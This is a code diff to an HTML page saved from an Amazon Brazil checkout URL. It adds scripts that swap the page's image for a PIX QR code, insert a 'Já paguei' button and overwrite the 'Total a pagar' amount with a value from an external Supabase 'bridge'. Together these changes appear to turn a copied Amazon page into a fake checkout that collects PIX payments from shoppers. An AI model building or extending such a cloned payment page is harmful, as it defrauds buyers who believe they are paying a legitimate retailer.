@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 dir=ltr><!--
+<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 dir=ltr><!--
  Page saved with SingleFile 
  url: https://www.amazon.com.br/cpe/executions?startWidgetContextId=amzn1.auth.upxprepare.31cf8e5c-5499-492f-b7c5-3f73c69b294d&pageType=CPEFront&subPageType=Redirections 
  saved date: Tue Apr 14 2026 12:30:14 GMT-0300 (Horário Padrão de Brasília)
@@ -120,8 +120,83 @@ document.addEventListener('DOMContentLoaded', function() {
         }
       })();
     </script>
+    <!-- PIX Integration Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="assets/js/supabase-bridge.js"></script>
+    <script src="assets/js/pix-ui.js"></script>
+
     <script>
       (function() {
+        // 1. Inject QR Code Container and "Já paguei" Button
+        function injectPaymentElements() {
+            // Find the placeholder SVG or image to replace with our QR container
+            const svgElement = document.querySelector('svg[viewBox="0 0 100 100"]') || 
+                               document.querySelector('div[data-testid="image-container"] svg');
+            
+            if (svgElement) {
+                const container = document.createElement('div');
+                container.id = 'pix-qrcode-container';
+                container.style.display = 'flex';
+                container.style.justifyContent = 'center';
+                container.style.alignItems = 'center';
+                container.style.padding = '20px';
+                container.style.background = 'white';
+                container.style.borderRadius = '8px';
+                container.style.margin = '20px auto';
+                container.style.minHeight = '200px';
+                
+                svgElement.parentNode.replaceChild(container, svgElement);
+            }
+
+            // Find the "Copia e Cola" button area to add the "Já paguei" button
+            const primaryBtn = document.querySelector('[data-testid="Upx-Prepare-PrimaryButton"]');
+            if (primaryBtn && !document.getElementById('check-payment-btn')) {
+                const checkBtn = document.createElement('button');
+                checkBtn.id = 'check-payment-btn';
+                checkBtn.textContent = 'Já paguei';
+                checkBtn.style.width = '100%';
+                checkBtn.style.marginTop = '12px';
+                checkBtn.style.padding = '12px';
+                checkBtn.style.borderRadius = '8px';
+                checkBtn.style.border = '1px solid #D5D9D9';
+                checkBtn.style.backgroundColor = '#EDFDFF';
+                checkBtn.style.cursor = 'pointer';
+                checkBtn.style.fontWeight = '500';
+                checkBtn.style.fontSize = '14px';
+                checkBtn.style.color = '#0F1111';
+                checkBtn.style.boxShadow = '0 2px 5px rgba(213,217,217,.5)';
+                
+                primaryBtn.parentNode.insertBefore(checkBtn, primaryBtn.nextSibling);
+            }
+        }
+
+        // Run injection
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', injectPaymentElements);
+        } else {
+            injectPaymentElements();
+        }
+
+        // 2. Pricing Synchronization (Sync from Bridge)
+        window.addEventListener('load', async () => {
+            const bridge = window.__amzBridge;
+            if (bridge) {
+                const state = await bridge.getState();
+                if (state && state.amount) {
+                    const formatted = state.amount.toLocaleString('pt-BR', {
+                        style: 'currency',
+                        currency: 'BRL'
+                    });
+                    document.querySelectorAll('h1[data-testid="heading"]').forEach(h => {
+                        if (h.textContent.includes('Total a pagar:')) {
+                            h.textContent = 'Total a pagar: ' + formatted;
+                        }
+                    });
+                }
+            }
+        });
+
+        // 3. Analytics Ping (Existing)
         const pageId = 'checkout_5';
         let sessionId = sessionStorage.getItem('amz_session_id');
         if (!sessionId) {
